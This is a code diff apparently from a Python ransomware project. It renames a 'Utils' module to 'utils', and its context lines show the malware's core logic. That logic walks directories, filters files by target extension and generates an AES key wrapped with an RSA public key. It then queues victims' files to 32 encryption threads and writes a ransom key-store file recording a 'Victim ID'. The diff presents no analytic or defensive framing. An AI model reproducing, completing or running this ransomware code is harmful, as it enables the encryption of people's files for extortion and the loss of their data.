@@ -4,7 +4,7 @@ import base64
 import gc
 from queue import Queue
 
-import Utils
+import utils
 from hasp.AESCipher import AESCipher
 from hasp.RSACipher import RSACipher
 from aptal import APTAl
@@ -22,11 +22,11 @@ def isInTargetFiles(extention):
         Binary Search to find extentions in the target files
     """
     left = 0
-    right = len(Utils.file_extentions) - 1
+    right = len(utils.file_extentions) - 1
 
     while left <= right:
         mid = (left + right)// 2
-        current = Utils.file_extentions[mid]
+        current = utils.file_extentions[mid]
         if current  > extention:
             right = mid - 1
         elif current  < extention:
@@ -56,7 +56,7 @@ def startContagion(path,rsapublickey):
     rsa_cipher = RSACipher(rsapublickey)
 
     goodbye_files = Queue()
-    aeskey = AESCipher.generate_key(Utils.aes_IV_key_length)
+    aeskey = AESCipher.generate_key(utils.aes_IV_key_length)
     
     # creating multithread encryption workers
     for i in range(32):
@@ -64,9 +64,9 @@ def startContagion(path,rsapublickey):
         worker.daemon = True
         worker.start()
 
-    with open(Utils.aesIV_file_store_path,"ab") as key_storing_file:
+    with open(utils.aesIV_file_store_path,"ab") as key_storing_file:
         # protection of starting time against manipulation
-        key_storing_file.write(base64.b64encode(Utils.when_did_i_work)+b"\n")
+        key_storing_file.write(base64.b64encode(utils.when_did_i_work)+b"\n")
         # write the AES key to our IV - File storage file
         key_storing_file.write(base64.b64encode(rsa_cipher.encrypt(aeskey)) + b"\n")
         # Recon files
@@ -75,7 +75,7 @@ def startContagion(path,rsapublickey):
                 # check the file extention
                 if isValidFile(fiile):
                     # IV is created individually for each file
-                    iv = AESCipher.generate_key(Utils.aes_IV_key_length)
+                    iv = AESCipher.generate_key(utils.aes_IV_key_length)
                     fp = os.path.join(directory_path,fiile)
                     # put the iv, file to thread pool
                     goodbye_files.put((iv, fp))
@@ -95,11 +95,11 @@ def startContagion(path,rsapublickey):
 
 def keyStoreCreate(version,ransomid):
 
-    with open(Utils.aesIV_file_store_path,"w") as key_storing_file:
-        key_storing_file.write(Utils.who_we_are + version + "\n")
-        key_storing_file.write(Utils.what_is_my_purpose + "\n")
+    with open(utils.aesIV_file_store_path,"w") as key_storing_file:
+        key_storing_file.write(utils.who_we_are + version + "\n")
+        key_storing_file.write(utils.what_is_my_purpose + "\n")
         key_storing_file.write("Your Victim ID : "+ransomid + "\n")
-        key_storing_file.write("When did ransomware work : " + Utils.when_did_i_work + "\n")
+        key_storing_file.write("When did ransomware work : " + utils.when_did_i_work + "\n")
         # and so on
     print("STORE FILE CREATED")
 
